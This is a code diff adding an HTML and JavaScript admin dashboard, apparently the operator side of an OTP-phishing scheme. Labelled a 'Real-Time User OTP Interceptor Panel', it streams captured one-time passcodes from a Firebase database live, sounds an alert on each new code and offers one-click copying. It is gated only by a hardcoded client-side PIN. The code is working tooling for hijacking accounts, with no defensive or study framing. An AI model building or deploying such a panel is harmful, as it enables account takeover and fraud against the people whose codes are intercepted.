@@ -1,0 +1,392 @@
+```html
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AMAR Social Hub - Admin Dashboard</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            cyan: '#00f2fe',
+                            blue: '#4facfe',
+                            purple: '#7f00ff',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background: #090d16;
+            min-height: 100vh;
+            color: #f8fafc;
+            font-family: 'Inter', sans-serif;
+        }
+        .glass-card {
+            background: rgba(15, 23, 42, 0.75);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .new-entry-anim {
+            animation: highlightPulse 2s ease-out;
+        }
+        @keyframes highlightPulse {
+            0% { background-color: rgba(0, 242, 254, 0.25); }
+            100% { background-color: transparent; }
+        }
+    </style>
+</head>
+<body class="p-3 sm:p-6">
+
+    <!-- LOGIN PIN MODAL (Security Gate) -->
+    <div id="loginModal" class="fixed inset-0 bg-slate-950/90 backdrop-blur-md z-50 flex items-center justify-center p-4">
+        <div class="glass-card max-w-sm w-full rounded-2xl p-6 text-center shadow-2xl border border-cyan-500/20">
+            <div class="w-14 h-14 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 flex items-center justify-center mx-auto mb-4 text-2xl">
+                <i class="fa-solid fa-user-shield"></i>
+            </div>
+            <h2 class="text-2xl font-bold text-white mb-1">Admin Authorization</h2>
+            <p class="text-xs text-slate-400 mb-6">Enter Admin Passcode to view incoming OTPs</p>
+            
+            <div class="space-y-4">
+                <input 
+                    type="password" 
+                    id="adminPinInput" 
+                    placeholder="Enter PIN (Default: 778899)"
+                    class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-center text-xl font-mono text-cyan-400 tracking-widest outline-none focus:border-cyan-400"
+                >
+                <div id="pinError" class="text-xs text-rose-400 hidden">Incorrect Passcode! Access Denied.</div>
+                <button 
+                    onclick="verifyAdminPIN()" 
+                    class="w-full py-3 bg-gradient-to-r from-cyan-500 to-blue-600 rounded-xl font-bold text-slate-900 hover:brightness-110 transition shadow-lg shadow-cyan-500/20"
+                >
+                    Unlock Admin Panel
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN DASHBOARD CONTENT -->
+    <div id="dashboardContent" class="max-w-7xl mx-auto space-y-6 hidden">
+        
+        <!-- Header -->
+        <header class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 glass-card p-5 rounded-2xl">
+            <div>
+                <div class="flex items-center gap-3">
+                    <h1 class="text-2xl sm:text-3xl font-extrabold bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 to-purple-500">
+                        AMAR Social Hub
+                    </h1>
+                    <span class="px-2.5 py-0.5 rounded-full text-xs font-semibold bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 flex items-center gap-1.5">
+                        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Live Stream
+                    </span>
+                </div>
+                <p class="text-xs text-slate-400 mt-1">Real-Time User OTP Interceptor Panel</p>
+            </div>
+
+            <!-- Dashboard Stats Bar -->
+            <div class="flex items-center gap-3 w-full sm:w-auto">
+                <div class="bg-slate-900/80 border border-slate-800 rounded-xl px-4 py-2 text-center flex-1 sm:flex-none">
+                    <div class="text-xs text-slate-400">Total Requests</div>
+                    <div id="statTotal" class="text-lg font-bold text-white">0</div>
+                </div>
+                <div class="bg-slate-900/80 border border-slate-800 rounded-xl px-4 py-2 text-center flex-1 sm:flex-none">
+                    <div class="text-xs text-slate-400">Active Pending</div>
+                    <div id="statPending" class="text-lg font-bold text-amber-400">0</div>
+                </div>
+                <button onclick="logoutAdmin()" class="p-3 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 border border-rose-500/30 rounded-xl transition">
+                    <i class="fa-solid fa-power-off"></i>
+                </button>
+            </div>
+        </header>
+
+        <!-- Live OTP Table / Cards View -->
+        <main class="glass-card rounded-2xl p-4 sm:p-6">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                    <i class="fa-solid fa-list-check text-cyan-400"></i> Incoming OTP Log
+                </h2>
+                <div class="text-xs text-slate-400" id="lastUpdatedText">
+                    Listening for live requests...
+                </div>
+            </div>
+
+            <!-- Desktop View Table -->
+            <div class="hidden md:block overflow-x-auto">
+                <table class="w-full text-left border-collapse">
+                    <thead>
+                        <tr class="border-b border-slate-800 text-xs font-semibold text-slate-400 uppercase tracking-wider">
+                            <th class="p-3">Session ID</th>
+                            <th class="p-3">Time</th>
+                            <th class="p-3">OTP Code</th>
+                            <th class="p-3">Status</th>
+                            <th class="p-3 text-right">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="otpTableBody" class="divide-y divide-slate-800/50 text-sm">
+                        <tr>
+                            <td colspan="5" class="text-center py-8 text-slate-500">
+                                <i class="fa-solid fa-spinner fa-spin text-xl mb-2"></i>
+                                <p>Connecting to Firestore real-time stream...</p>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <!-- Mobile View Cards -->
+            <div id="otpCardsMobile" class="md:hidden space-y-3">
+                <div class="text-center py-8 text-slate-500">
+                    <i class="fa-solid fa-spinner fa-spin text-xl mb-2"></i>
+                    <p>Loading real-time updates...</p>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Notification Sound (Synthesized Audio Context) -->
+    <script>
+        function playBeepSound() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(880, ctx.currentTime); // 880 Hz pitch
+                gain.gain.setValueAtTime(0.1, ctx.currentTime);
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                osc.stop(ctx.currentTime + 0.2);
+            } catch (e) {
+                console.log("Audio not allowed yet");
+            }
+        }
+    </script>
+
+    <!-- Firebase Admin Script -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, onSnapshot, doc, updateDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        const DEFAULT_PIN = "778899";
+
+        // Admin Security Check
+        window.verifyAdminPIN = function() {
+            const input = document.getElementById('adminPinInput').value;
+            if (input === DEFAULT_PIN) {
+                document.getElementById('loginModal').classList.add('hidden');
+                document.getElementById('dashboardContent').classList.remove('hidden');
+                initAdminDashboard();
+            } else {
+                document.getElementById('pinError').classList.remove('hidden');
+            }
+        };
+
+        window.logoutAdmin = function() {
+            document.getElementById('loginModal').classList.remove('hidden');
+            document.getElementById('dashboardContent').classList.add('hidden');
+            document.getElementById('adminPinInput').value = '';
+        };
+
+        const firebaseConfig = typeof __firebase_config !== 'undefined' 
+            ? JSON.parse(__firebase_config) 
+            : {
+                apiKey: "YOUR_API_KEY",
+                authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+                projectId: "YOUR_PROJECT_ID",
+                storageBucket: "YOUR_PROJECT_ID.appspot.com",
+                messagingSenderId: "YOUR_SENDER_ID",
+                appId: "YOUR_APP_ID"
+            };
+
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'amar-social-hub';
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        let previousDocCount = -1;
+
+        async function initAdminDashboard() {
+            try {
+                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                    await signInWithCustomToken(auth, __initial_auth_token);
+                } else {
+                    await signInAnonymously(auth);
+                }
+            } catch (e) {
+                console.error("Admin Auth Error:", e);
+            }
+
+            onAuthStateChanged(auth, (user) => {
+                if (user) {
+                    listenToOTPs();
+                }
+            });
+        }
+
+        function listenToOTPs() {
+            const otpsCollection = collection(db, 'artifacts', appId, 'public', 'data', 'otp_requests');
+
+            // Real-time Firestore Listener
+            onSnapshot(otpsCollection, (snapshot) => {
+                const items = [];
+                snapshot.forEach(docSnap => {
+                    items.push({ id: docSnap.id, ...docSnap.data() });
+                });
+
+                // Memory sort by createdAt descending
+                items.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
+
+                // Check for new incoming records for sound trigger
+                if (previousDocCount !== -1 && items.length > previousDocCount) {
+                    playBeepSound();
+                }
+                previousDocCount = items.length;
+
+                renderData(items);
+            }, (error) => {
+                console.error("Firestore Listen Error:", error);
+            });
+        }
+
+        function renderData(items) {
+            const tbody = document.getElementById('otpTableBody');
+            const mobileView = document.getElementById('otpCardsMobile');
+            
+            let pendingCount = 0;
+
+            if (items.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" class="text-center py-8 text-slate-500">No OTP requests received yet.</td></tr>`;
+                mobileView.innerHTML = `<div class="text-center py-8 text-slate-500">No OTP requests received yet.</div>`;
+                document.getElementById('statTotal').innerText = '0';
+                document.getElementById('statPending').innerText = '0';
+                return;
+            }
+
+            let tableHtml = '';
+            let cardHtml = '';
+
+            items.forEach(item => {
+                if (item.status === 'PENDING') pendingCount++;
+
+                const formattedTime = item.createdAt ? new Date(item.createdAt).toLocaleTimeString() : 'N/A';
+                const isVerified = item.status === 'VERIFIED';
+                
+                const statusBadge = isVerified 
+                    ? `<span class="px-2.5 py-1 rounded-full text-xs bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-medium">VERIFIED</span>`
+                    : `<span class="px-2.5 py-1 rounded-full text-xs bg-amber-500/10 text-amber-400 border border-amber-500/30 font-medium">PENDING</span>`;
+
+                // Desktop row
+                tableHtml += `
+                    <tr class="hover:bg-slate-800/30 transition">
+                        <td class="p-3 font-mono text-xs text-slate-300">${item.sessionId || 'N/A'}</td>
+                        <td class="p-3 text-xs text-slate-400">${formattedTime}</td>
+                        <td class="p-3 font-mono font-bold text-lg text-cyan-300 tracking-wider">${item.otpCode}</td>
+                        <td class="p-3">${statusBadge}</td>
+                        <td class="p-3 text-right space-x-2">
+                            <button onclick="copyCode('${item.otpCode}')" class="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg text-xs transition" title="Copy OTP">
+                                <i class="fa-solid fa-copy"></i>
+                            </button>
+                            ${!isVerified ? `
+                                <button onclick="markVerified('${item.id}')" class="px-2.5 py-1.5 bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 rounded-lg text-xs transition" title="Verify">
+                                    <i class="fa-solid fa-check"></i>
+                                </button>
+                            ` : ''}
+                            <button onclick="deleteOTP('${item.id}')" class="px-2.5 py-1.5 bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 rounded-lg text-xs transition" title="Delete">
+                                <i class="fa-solid fa-trash"></i>
+                            </button>
+                        </td>
+                    </tr>
+                `;
+
+                // Mobile Card
+                cardHtml += `
+                    <div class="bg-slate-900/90 border border-slate-800 rounded-xl p-4 space-y-3">
+                        <div class="flex justify-between items-center">
+                            <span class="font-mono text-xs text-slate-400">${item.sessionId || 'N/A'}</span>
+                            ${statusBadge}
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <div>
+                                <div class="text-[10px] text-slate-500 uppercase">OTP Code</div>
+                                <div class="font-mono font-extrabold text-2xl text-cyan-300 tracking-wider">${item.otpCode}</div>
+                            </div>
+                            <div class="text-right">
+                                <div class="text-[10px] text-slate-500">Received</div>
+                                <div class="text-xs text-slate-300">${formattedTime}</div>
+                            </div>
+                        </div>
+                        <div class="flex justify-end gap-2 pt-2 border-t border-slate-800/80">
+                            <button onclick="copyCode('${item.otpCode}')" class="flex-1 py-1.5 bg-slate-800 text-slate-300 rounded-lg text-xs flex items-center justify-center gap-1">
+                                <i class="fa-solid fa-copy"></i> Copy
+                            </button>
+                            ${!isVerified ? `
+                                <button onclick="markVerified('${item.id}')" class="flex-1 py-1.5 bg-emerald-500/20 text-emerald-300 rounded-lg text-xs flex items-center justify-center gap-1">
+                                    <i class="fa-solid fa-check"></i> Verify
+                                </button>
+                            ` : ''}
+                            <button onclick="deleteOTP('${item.id}')" class="py-1.5 px-3 bg-rose-500/20 text-rose-300 rounded-lg text-xs">
+                                <i class="fa-solid fa-trash"></i>
+                            </button>
+                        </div>
+                    </div>
+                `;
+            });
+
+            tbody.innerHTML = tableHtml;
+            mobileView.innerHTML = cardHtml;
+
+            document.getElementById('statTotal').innerText = items.length.toString();
+            document.getElementById('statPending').innerText = pendingCount.toString();
+            document.getElementById('lastUpdatedText').innerText = `Last sync: ${new Date().toLocaleTimeString()}`;
+        }
+
+        // Action Handlers
+        window.markVerified = async function(docId) {
+            try {
+                const docRef = doc(db, 'artifacts', appId, 'public', 'data', 'otp_requests', docId);
+                await updateDoc(docRef, { status: 'VERIFIED' });
+            } catch (e) {
+                console.error("Error updating:", e);
+            }
+        };
+
+        window.deleteOTP = async function(docId) {
+            try {
+                const docRef = doc(db, 'artifacts', appId, 'public', 'data', 'otp_requests', docId);
+                await deleteDoc(docRef);
+            } catch (e) {
+                console.error("Error deleting:", e);
+            }
+        };
+
+        window.copyCode = function(code) {
+            const tempInput = document.createElement("input");
+            tempInput.value = code;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+            
+            const lastText = document.getElementById('lastUpdatedText').innerText;
+            document.getElementById('lastUpdatedText').innerText = 'Copied to clipboard!';
+            setTimeout(() => {
+                document.getElementById('lastUpdatedText').innerText = lastText;
+            }, 1500);
+        };
+    </script>
+</body>
+</html>
+```
